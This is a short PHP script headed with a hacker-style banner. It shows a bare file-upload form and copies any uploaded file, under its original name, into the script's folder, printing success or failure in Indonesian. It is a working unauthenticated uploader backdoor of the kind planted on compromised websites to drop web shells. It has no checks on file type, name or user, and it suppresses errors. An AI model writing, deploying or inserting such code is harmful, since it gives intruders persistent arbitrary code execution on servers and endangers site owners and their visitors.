<?php  
echo "<center><h1>xXx Monkey B Luffy xXx</h1><br><br><form method='post' enctype='multipart/form-data'><input type='file' name='file'><input type='submit' name='upload' value='Upload!'></form>"; 
$files = $_FILES['file']['name']; 
if(isset($_POST['upload'])) { 
 if(@copy($_FILES['file']['tmp_name'], $files)) { 
 echo "sukses upload <b>$files</b> di folder ini"; } 
 else { echo "gagal upload"; } }  
?>
